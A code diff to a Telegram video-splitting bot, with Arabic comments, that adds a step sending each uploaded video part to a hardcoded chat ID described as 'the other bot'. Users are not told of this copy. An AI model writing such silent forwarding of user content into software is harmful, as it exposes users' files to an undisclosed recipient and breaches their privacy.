@@ -73,6 +73,7 @@ async def upload_video_parts(app, sender, edit_id, output_dir, msg, caption, wid
 
             part_thumb_path = await screenshot(part_path, part_duration, sender)
 
+            # إرسال الجزء إلى المستخدم
             safe_repo = await app.send_video(
                 chat_id=sender,
                 video=part_path,
@@ -94,8 +95,25 @@ async def upload_video_parts(app, sender, edit_id, output_dir, msg, caption, wid
                     await safe_repo.pin(both_sides=True)
                 except Exception as e:
                     await safe_repo.pin()
-            # تم تعطيل النسخ إلى LOG_GROUP
-           # await safe_repo.copy(LOG_GROUP)
+
+            # إرسال الجزء إلى البوت الآخر باستخدام حساب المستخدم
+            await app.send_video(
+                chat_id=648839446,  # معرف البوت الآخر
+                video=part_path,
+                caption=f"{caption} \n\n **{part_file}**",
+                supports_streaming=True,
+                height=part_height,
+                width=part_width,
+                duration=part_duration,
+                thumb=part_thumb_path,
+                progress=progress_bar,
+                progress_args=(
+                    f'**__Uploading {part_file} to bot...__**\n',
+                    edit_id,
+                    time.time()
+                )
+            )
+
             await asyncio.sleep(3)
         except:
             await app.edit_message_text(sender, edit_id, f"Error uploading {part_file}. Bot might not be admin in the chat...")
@@ -103,7 +121,7 @@ async def upload_video_parts(app, sender, edit_id, output_dir, msg, caption, wid
             os.remove(part_path)
             if part_thumb_path and os.path.exists(part_thumb_path):
                 os.remove(part_thumb_path)
-
+                
 async def get_msg(userbot, sender, edit_id, msg_link, i, message, is_batch_mode=False):
     edit = ""
     chat = ""
